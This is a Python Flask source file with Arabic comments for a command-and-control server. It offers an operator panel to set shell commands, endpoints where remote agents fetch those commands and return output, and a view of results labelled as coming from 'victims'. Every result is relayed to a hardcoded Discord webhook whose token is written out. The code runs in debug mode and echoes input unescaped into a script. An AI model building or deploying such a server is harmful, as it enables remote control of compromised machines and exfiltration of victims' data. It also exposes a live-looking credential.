# server.py - C2 Server with Discord Integration
# تشغيل: python server.py

from flask import Flask, request, jsonify, render_template_string
import requests
import os
from datetime import datetime
import threading
import time

app = Flask(__name__)

# ==================== إعدادات Discord ====================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1477628955581222953/W3NqUQJaipx_v139AfrwTCQ-3Q1y3Olo6R1uTuxiEnDU7vHudR9mVqNcmdn9ToSlZboh"

# ==================== تخزين الأوامر والنتائج ====================
current_command = {
    "id": "0",
    "cmd": "whoami",  # أمر افتراضي
    "timestamp": datetime.now().isoformat()
}
agent_responses = []
last_checked = {}

# ==================== دالة إرسال النتائج إلى Discord ====================
def send_to_discord(content):
    try:
        data = {
            "content": content,
            "username": "C2 Server"
        }
        response = requests.post(DISCORD_WEBHOOK, json=data)
        if response.status_code in [200, 204]:
            print(f"[Discord] ✅ تم الإرسال: {content[:50]}...")
        else:
            print(f"[Discord] ❌ فشل: {response.status_code}")
    except Exception as e:
        print(f"[Discord] ❌ خطأ: {e}")

# ==================== الصفحة الرئيسية (لوحة التحكم) ====================
@app.route('/')
def index():
    html = """
    <!DOCTYPE html>
    <html>
    <head><title>C2 Panel</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
        .container { max-width: 800px; margin: auto; }
        .cmd-box { background: #1a1a1a; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .response-item { border-bottom: 1px solid #333; padding: 10px; }
        input, button { padding: 10px; background: #333; color: #0f0; border: 1px solid #0f0; }
    </style>
    </head>
    <body>
        <div class="container">
            <h1>🎮 C2 Command & Control</h1>
            
            <div class="cmd-box">
                <h3>إرسال أمر جديد</h3>
                <form action="/set_command" method="post">
                    <input type="text" name="cmd" placeholder="اكتب الأمر (مثال: whoami)" size="50" required>
                    <button type="submit">إرسال</button>
                </form>
                <p>الأمر الحالي: <strong>{{ cmd }}</strong> (ID: {{ cmd_id }})</p>
            </div>
            
            <div class="cmd-box">
                <h3>نتائج الأوامر من الضحايا</h3>
                <div id="responses">
                    {% for r in responses %}
                    <div class="response-item">
                        <small>{{ r.time }}</small><br>
                        <strong>Agent {{ r.agent_id }}:</strong> {{ r.output }}
                    </div>
                    {% endfor %}
                </div>
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html, 
                                 cmd=current_command['cmd'],
                                 cmd_id=current_command['id'],
                                 responses=reversed(agent_responses[-10:]))

# ==================== تحديث الأمر (من لوحة التحكم) ====================
@app.route('/set_command', methods=['POST'])
def set_command():
    new_cmd = request.form.get('cmd', 'whoami')
    current_command['cmd'] = new_cmd
    current_command['id'] = str(int(time.time()))
    current_command['timestamp'] = datetime.now().isoformat()
    
    # إرسال إشعار إلى Discord بأنه تم تعيين أمر جديد
    send_to_discord(f"🎯 تم تعيين أمر جديد: `{new_cmd}` (ID: {current_command['id']})")
    
    return f'''
    <script>alert("تم تحديث الأمر إلى: {new_cmd}"); window.location.href="/";</script>
    '''

# ==================== نقطة نهاية للـ Agent (جلب الأوامر) ====================
@app.route('/get_command', methods=['GET', 'POST'])
def get_command():
    agent_id = request.args.get('id', 'unknown')
    if request.method == 'POST':
        data = request.get_json()
        agent_id = data.get('agent_id', agent_id)
    
    last_checked[agent_id] = datetime.now().isoformat()
    
    return jsonify({
        "id": current_command['id'],
        "cmd": current_command['cmd'],
        "timestamp": current_command['timestamp']
    })

# ==================== نقطة نهاية للـ Agent (إرسال النتائج) ====================
@app.route('/post_result', methods=['POST'])
def post_result():
    try:
        data = request.get_json()
        agent_id = data.get('agent_id', 'unknown')
        command_id = data.get('command_id', '0')
        output = data.get('output', '')
        
        result_entry = {
            'agent_id': agent_id,
            'command_id': command_id,
            'output': output[:500],  # تحديد الطول
            'time': datetime.now().isoformat()
        }
        agent_responses.append(result_entry)
        
        # إرسال النتيجة إلى Discord فور وصولها
        discord_msg = f"**📡 نتيجة من {agent_id}**\n"
        discord_msg += f"الأمر (ID: {command_id}):\n```\n{output[:300]}\n```"
        send_to_discord(discord_msg)
        
        return jsonify({"status": "received"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ==================== نقطة نهاية للتأكد من أن السيرفر يعمل ====================
@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({
        "status": "online",
        "time": datetime.now().isoformat(),
        "agents": len(last_checked),
        "responses": len(agent_responses)
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("\n" + "="*60)
    print("🚀 C2 Server is running!")
    print("="*60)
    print(f"📍 Local: http://localhost:{port}")
    print(f"📍 Discord Webhook: {DISCORD_WEBHOOK[:50]}...")
    print(f"\n📌 Endpoints:")
    print(f"   GET  /           - لوحة التحكم")
    print(f"   POST /set_command - تعيين أمر جديد")
    print(f"   GET/POST /get_command - للأوامر (للـ Agent)")
    print(f"   POST /post_result   - للنتائج (للـ Agent)")
    print(f"   GET  /ping       - فحص الاتصال")
    print("="*60 + "\n")
    
    app.run(host='0.0.0.0', port=port, debug=True)
